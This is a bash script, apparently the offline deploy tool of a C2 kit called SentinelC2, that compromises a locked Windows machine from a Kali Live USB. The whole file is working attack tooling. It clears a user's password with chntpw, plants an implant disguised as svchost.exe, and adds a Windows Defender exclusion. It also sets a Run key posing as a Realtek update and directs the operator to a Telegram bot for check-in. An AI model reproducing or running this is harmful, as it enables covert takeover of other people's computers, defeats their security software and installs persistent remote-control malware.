#!/bin/bash
# SentinelC2 offline deploy — drops the implant on a locked Windows box.
# Run from a Kali Live session after booting from the Ventoy USB.
#
# Usage:   sudo ./deploy_kali.sh <windows-user> [win-partition]
# Example: sudo ./deploy_kali.sh sentinal
#          sudo ./deploy_kali.sh sentinal /dev/nvme0n1p2
#
# If no partition is given, the largest NTFS partition is picked automatically.
set -e

TARGET_USER="$1"
WIN_PART="${2:-}"

# --- List mode: no args / --list / -l → enumerate users, exit ---------------
if [[ -z "$TARGET_USER" || "$TARGET_USER" == "--list" || "$TARGET_USER" == "-l" ]]; then
  if [[ -z "$WIN_PART" ]]; then
    WIN_PART=$(lsblk -rno NAME,FSTYPE,SIZE \
                 | awk '$2=="ntfs"{printf "/dev/%s %s\n",$1,$3}' \
                 | sort -k2 -h | tail -1 | awk '{print $1}')
    [[ -z "$WIN_PART" ]] && { echo "[!] No NTFS partition found."; exit 1; }
    echo "[*] Auto-picked Windows partition: $WIN_PART"
  fi
  mkdir -p /mnt
  if ! mount -t ntfs-3g -o rw,remove_hiberfile,force "$WIN_PART" /mnt 2>/dev/null; then
    echo "[!] RW mount failed, trying RO..."
    mount -t ntfs-3g -o ro "$WIN_PART" /mnt \
      || { echo "[!] Mount failed entirely. BitLocker? Hibernation? Wrong partition?"; exit 1; }
  fi
  echo ""
  if command -v chntpw >/dev/null 2>&1; then
    echo "[*] User accounts on this Windows install (from SAM hive):"
    echo "------------------------------------------------------------"
    chntpw -l /mnt/Windows/System32/config/SAM 2>&1 \
      | grep -E '^\| [0-9a-fA-F]+ ' | sed 's/^/    /'
    echo "------------------------------------------------------------"
  else
    echo "[*] chntpw not available; falling back to /mnt/Users/ profile folders:"
    echo "------------------------------------------------------------"
    ls /mnt/Users/ | sed 's/^/    /'
    echo "------------------------------------------------------------"
  fi
  echo ""
  echo "Profile folders only show users who have ever logged in."
  echo "Pick the one you want to target, then re-run:"
  echo "    sudo $0 <username>"
  echo "    sudo $0 <username> /dev/sdX2     # to pin a specific partition"
  umount /mnt 2>/dev/null
  exit 0
fi

# --- Find the Ventoy USB ------------------------------------------------------
USB_MNT=""
# 1) Check common auto-mount paths first
for candidate in /media/kali/Ventoy /media/*/Ventoy /run/media/kali/Ventoy /run/media/*/Ventoy; do
  for d in $candidate; do
    if [[ -f "$d/sentinel_tg_aggressive.exe" ]] || [[ -f "$d/sentinel_tg_aggressive" ]]; then
      USB_MNT="$d"; break 2
    fi
  done
done
# 2) If not found, look for any partition labeled "Ventoy" and mount it ourselves
if [[ -z "$USB_MNT" ]]; then
  VENTOY_DEV=$(lsblk -rno NAME,LABEL | awk '$2=="Ventoy"{print "/dev/"$1}' | head -1)
  if [[ -n "$VENTOY_DEV" ]]; then
    mkdir -p /media/kali/Ventoy
    mount "$VENTOY_DEV" /media/kali/Ventoy 2>/dev/null \
      || mount -t exfat "$VENTOY_DEV" /media/kali/Ventoy 2>/dev/null \
      || mount -t vfat "$VENTOY_DEV" /media/kali/Ventoy 2>/dev/null
    if [[ -f "/media/kali/Ventoy/sentinel_tg_aggressive.exe" ]] || [[ -f "/media/kali/Ventoy/sentinel_tg_aggressive" ]]; then
      USB_MNT="/media/kali/Ventoy"
    else
      umount /media/kali/Ventoy 2>/dev/null
    fi
  fi
fi
# 3) Last-ditch: scan anything mounted for the file
if [[ -z "$USB_MNT" ]]; then
  USB_MNT=$(find /media /run/media /mnt -maxdepth 3 -name 'sentinel_tg_aggressive*' 2>/dev/null | head -1 | xargs -r dirname)
fi
if [[ -z "$USB_MNT" ]]; then
  echo "[!] Ventoy USB not found. Plug it in and check 'lsblk -f' for the 'Ventoy' label."
  echo "    Then mount manually, e.g.:  sudo mount /dev/sda1 /media/kali/Ventoy"
  exit 1
fi
echo "[*] USB mount:        $USB_MNT"

# --- Find the Windows partition ---------------------------------------------
if [[ -z "$WIN_PART" ]]; then
  WIN_PART=$(lsblk -rno NAME,FSTYPE,SIZE \
               | awk '$2=="ntfs"{printf "/dev/%s %s\n",$1,$3}' \
               | sort -k2 -h | tail -1 | awk '{print $1}')
  [[ -z "$WIN_PART" ]] && { echo "[!] No NTFS partition found."; exit 1; }
  echo "[*] Windows partition (auto): $WIN_PART  (largest NTFS)"
else
  echo "[*] Windows partition (given): $WIN_PART"
fi

# --- Mount Windows -----------------------------------------------------------
# If Kali auto-mounted it (common with the file manager), unmount first so we
# can get a clean read-write mount at /mnt.
EXISTING=$(grep -F " $WIN_PART " /proc/mounts | awk '{print $2}' | head -1)
if [[ -n "$EXISTING" ]]; then
  echo "[*] $WIN_PART already mounted at $EXISTING, unmounting for fresh RW mount..."
  umount "$EXISTING" 2>/dev/null || { echo "[!] Could not unmount $EXISTING"; exit 1; }
fi
mkdir -p /mnt
mount -t ntfs-3g -o rw,remove_hiberfile,force "$WIN_PART" /mnt
echo "[*] Mounted at /mnt"

# --- Install chntpw if missing -----------------------------------------------
if ! command -v chntpw >/dev/null 2>&1; then
  echo "[*] Installing chntpw"
  apt update -qq && apt install -y -qq chntpw
fi

# --- Verify target user exists ----------------------------------------------
if [[ ! -d "/mnt/Users/$TARGET_USER" ]]; then
  echo "[!] User '$TARGET_USER' not found in /mnt/Users/. Available:"
  ls /mnt/Users/ | sed 's/^/    /'
  umount /mnt
  exit 1
fi

INSTALL_DIR="/mnt/Windows/ProgramData/Microsoft/Network/Connections/Cm"

# --- 1. Clear target user's password ----------------------------------------
echo "[*] Clearing password for $TARGET_USER"
printf '1\n%s\n1\nq\ny\n' "$TARGET_USER" \
  | chntpw -i /mnt/Windows/System32/config/SAM

# --- 2. Drop implant ---------------------------------------------------------
echo "[*] Dropping implant into $INSTALL_DIR"
mkdir -p "$INSTALL_DIR"
cp -f "$USB_MNT/sentinel_tg_aggressive.exe" "$INSTALL_DIR/svchost.exe"
cp -f "$USB_MNT/run.bat"                 "$INSTALL_DIR/run.bat"

# --- 3. Defender exclusion (HKLM\SOFTWARE hive) -----------------------------
echo "[*] Adding Defender path exclusion"
chntpw /mnt/Windows/System32/config/SOFTWARE <<'EOF'
cd Microsoft\Windows Defender\Exclusions\Paths
ed C:\ProgramData\Microsoft\Network\Connections\Cm
2
0
q
y
EOF

# --- 4. HKCU Run key for the target user ------------------------------------
echo "[*] Adding HKCU Run key"
chntpw -e "/mnt/Windows/Users/$TARGET_USER/NTUSER.DAT" <<'EOF'
cd Software\Microsoft\Windows\CurrentVersion\Run
ed Realtek HD Audio Update
C:\ProgramData\Microsoft\Network\Connections\Cm\run.bat
q
y
EOF

# --- Clean exit --------------------------------------------------------------
sync
umount /mnt
echo ""
echo "[+] Implant dropped + persistence wired."
echo "    EXE      : C:\\ProgramData\\Microsoft\\Network\\Connections\\Cm\\svchost.exe"
echo "    Launcher : C:\\ProgramData\\Microsoft\\Network\\Connections\\Cm\\run.bat"
echo "    Run key  : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Realtek HD Audio Update"
echo "    Defender : HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\ProgramData\\Microsoft\\Network\\Connections\\Cm = DWORD 0"
echo ""
echo "Next:  sudo shutdown -h now   (then PULL the USB after the fan stops)"
echo "       Boot Windows -> hit Enter on the password prompt"
echo "       Check Telegram @IamSentinal_bot for 'Sentinel online' within ~30s"
